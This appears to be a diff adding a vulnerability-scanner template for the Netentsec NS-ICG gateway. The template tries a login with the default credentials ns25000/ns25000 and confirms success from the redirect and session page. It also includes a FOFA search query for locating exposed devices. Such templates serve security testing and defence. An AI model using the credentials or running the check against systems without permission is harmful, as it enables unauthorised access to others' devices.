@@ -1,0 +1,53 @@
+id: nsicg-default-login
+
+info:
+  name: Netentsec NS-ICG - Default Login
+  author: pikpikcu
+  severity: high
+  description: |
+    Netentsec NS-ICG contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
+  reference: |
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2016-08603
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+    cpe: cpe:2.3:a:netentsec:application_security_gateway:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: "NS-ICG"
+    product: application_security_gateway
+    vendor: netentsec
+  tags: nsicg,default-login
+
+http:
+  - raw:
+      - |
+        @timeout: 25s
+        POST /user/login/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        usrname={{username}}&pass={{password}}&signinfo=&ukey_user_flag=0&SlotSerialNumber=&agree=
+      - |
+        @timeout: 25s
+        GET /user/main HTTP/1.1
+        Host: {{Hostname}}
+        Referer: {{BaseURL}}/user/login/
+
+    attack: pitchfork
+    payloads:
+      username:
+        - ns25000
+      password:
+        - ns25000
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(header_1, "/user/main/")'
+          - 'status_code_1 == 302'
+          - 'status_code_2 == 200'
+          - contains(body_2, "var loguser = \'ns25000")
+        condition: and
+# digest: 4a0a0047304502204fa9b0393f7b50842dde9575b9040f5c8ad2688f30eed43fbd7d247e87a81f95022100b82a4bba1fbc69117037181407c5eb65768baad9133f17af0f3dd511e309c813:922c64590222798bb761d5b6d8e72950
